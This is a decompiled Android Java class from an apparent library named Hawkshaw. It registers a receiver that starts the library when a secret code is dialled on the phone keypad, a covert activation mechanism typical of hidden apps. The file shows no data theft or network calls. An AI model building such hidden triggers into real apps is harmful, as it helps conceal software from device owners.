package com.hawkshaw.library.receivers;

import Y1.K;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.hawkshaw.library.Hawkshaw;
import com.hawkshaw.library.ktextensions.ContextKt;
import com.hawkshaw.library.logger.Logger;
import j3.f;

public final class SecretDialPadCodeReceiver extends BroadcastReceiver {
    public static final Companion Companion = new Companion((f) null);
    private static final String TAG = "SecretDialPadCodeReceiver";

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }
    }

    public void onReceive(Context context, Intent intent) {
        if (context != null) {
            ContextKt.toast(context, "Secret Code");
            Logger.v$default(Logger.INSTANCE, TAG, "Secret Code", false, 4, (Object) null);
            if (K.f("android.provider.Telephony.SECRET_CODE", intent != null ? intent.getAction() : null)) {
                Hawkshaw.initFromInternalActivity(false);
            }
        }
    }
}
